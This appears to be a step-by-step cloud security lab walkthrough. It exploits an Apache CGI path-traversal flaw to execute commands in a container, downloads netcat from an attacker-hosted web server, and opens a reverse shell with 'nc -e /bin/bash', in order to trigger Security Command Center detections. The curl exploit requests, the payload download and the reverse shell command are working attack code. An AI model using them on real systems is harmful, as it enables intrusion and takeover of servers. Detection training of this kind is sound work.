# 1. command to try and exploit our web server:
Replace NODEIP and NODEPORT of Container port opened
# you are calling a "/bin/sh" command on the remote linux container where the Apache server is running.
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; id"
```
This is the output of the id command. From this output we can understand that the remote Apache server is running with permissions of the "daemon" user.
```
uid=1(daemon) gid=1(daemon) groups=1(daemon)
```
Practically, this means that an intruder can run any commands on the remote Apache server without having any additional access like SSH.

You can try to elevate our permissions from the "daemon" to the "root" user, but this is not the purpose of this exercise. This simulation might look unrealistic, but when this exploit was detected for the first time, there were thousands of vulnerable versions of the Apache server running in the global Internet.

On the diagram you can see what is happening:

![image](https://github.com/Pruthvi360/linux_security/assets/107435692/ec1c3d94-588c-425a-a28b-8f89dd1eff69)

1. We run the "curl" command on the Attacker instance and connect to Apache
2. Apache runs the "id" command using "/bin/sh" shell
3. The "id" commands returns output to the Apache
4. Apache returns the output of the "id" command to the Attacker instance

**Our vulnerable Apache service is not exposed to the external world,
 we have built an internal-only configuration,
 so now we can investigate a bit further. You can experiment with different commands and try to explore the remote environment.**

# 2. Check the list of files in the root directory:
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; ls -l /"
```

# 3. Check the hostname of the remote host:
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; hostname"
```
# 4. Download it to the "attacker-instance" using the following set of commands to extract a binary file that we need:
```
gsutil cp \
gs://cloud-training/gsp1125/netcat-traditional_1.10-41.1_amd64.deb .
mkdir netcat-traditional
dpkg --extract netcat-traditional_1.10-41.1_amd64.deb netcat-traditional
```

# 5. First of all please determine the local IP address of our "attacker-instance" workstation:
```
LOCAL_IP=$(ip -4 addr show ens4 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
echo ${LOCAL_IP}
```

# 6. Now start a primitive python-based web-server in background mode:
```
python3 -m http.server --bind ${LOCAL_IP} \
--directory ~/netcat-traditional/bin/ 8888 &
```

# 8. Now check whether our local web server works or not by using the curl command:
```
curl http://${LOCAL_IP}:8888
```

# 9. On the container itself we initiate downloading the nc.traditional from our 
# "attacker-instance" using the following curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command:
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
--path-as-is --insecure --data "echo Content-Type: text/plain; echo; curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc"
```
![image](https://github.com/Pruthvi360/linux_security/assets/107435692/8003cbb2-a668-4595-a17f-7e4f1f01cefb)
1. We run the curl command on the Attacker instance and connect to the Apache
2. Apache runs the curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command using /bin/sh shell.
3. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command connects to the Attackers instance
4. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command fetches the nc.traditional binary file
5. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command saves the nc.traditional binary file as /tmp/nc file in the running container
6. The curl http://${LOCAL_IP}:8888/nc.traditional -o /tmp/nc command returns the message 10.8.0.8 - - [15/Jul/2023 18:11:34] "GET /nc.traditional HTTP/1.1" 200 - to Apache
7. Apache confirms that the remote command was executed successfully

# 10. Now netcat-traditional is on the remote container. Make it executable by using the chmod +x /tmp/nc command

```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; chmod +x /tmp/nc"
```

# 11. On the attacker's workstation enter this command to interrupt the running Python web-service:
```
pkill python
```
# 12. Run the following command to confirm there are no processes listening on any TCP ports:
```
lsof -i -sTCP:LISTEN
```
# 13. Run the following command to launch the /tmp/nc file inside our container:
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" \
--path-as-is \
--insecure \
--data "echo Content-Type: text/plain; echo; /tmp/nc"
```

# 14. This binary file was not included into the image when the image was built, so SCC must detect it and initiate the Finding Added Binary Executed.
# 15. Return to the Google Cloud Console.
# 16. Open the navigation menu and select Security > Security Command Center > Findings.
# 17. Set the Time range selector to Last hour.
# 18. In the "New threats over time" panel, find the finding Added Binary Executed:

![image](https://github.com/Pruthvi360/linux_security/assets/107435692/58a4e9bd-d6e7-43ec-9e60-79ac98fdbcde)

# 19. Arrange your two SSH windows side-by-side so you can easily toggle between the two:
![image](https://github.com/Pruthvi360/linux_security/assets/107435692/56e2a2ca-f38e-48b2-be00-98503e0f4c5b)

# 20. In the newly launched terminal window (the 2nd session), run the netcat server listening session:
```
nc -nlvp 8888
```
# 21. Run the following command to launch a reverse shell session from inside the Apache container:
```
curl "http://${NODE_IP}:${NODE_PORT}/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh" --path-as-is --insecure --data "echo Content-Type: text/plain; echo; /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash"
```
# This command will stay active and will block our current terminal. Do not interrupt it—this is normal behavior.

# 22. Toggle to the 2nd session, where you have just launched the nc -nlvp 8888 command.

# 23. In this window, ensure you see a message similar to the following:
```
Connection received on 10.8.0.9 46686
```
![image](https://github.com/Pruthvi360/linux_security/assets/107435692/f63b6af5-36d4-4a10-9485-809102dc49d7)

1. We run the curl command on the Attacker instance and connect to the Apache
2. Apache launches the /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash command using /bin/sh shell.
3. The /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash launches /bin/bash process
4. The /tmp/nc ${LOCAL_IP} 8888 -e /bin/bash command establishes connection to the Attacker instance and redirects input and output of the /bin/bash to the remote nc process, running on the Attacker's instance
5. The Attacker communicates with remote /bin/bash process interactively
The attacker can develop this attack further by launching possible scenarios such as:

Defacing the website
Running his/her own load in this container
Fetching the token of the Service Account and using it for exploiting the associated Google Cloud environment
All these scenarios are out of scope of the current lab.

Enter Ctrl+C in both SSH sessions to stop running commands.

Exit out of both SSH session windows by entering the "exit" command.

Note: You can also enter Cmnd + W to exit out of SSH windows.
Return to the Google Cloud Console.

Open the navigation menu and select Security > Security Command Center > Findings.

Set the time range to Last hour.

Ensure you see one (or two) findings for Reverse shell:
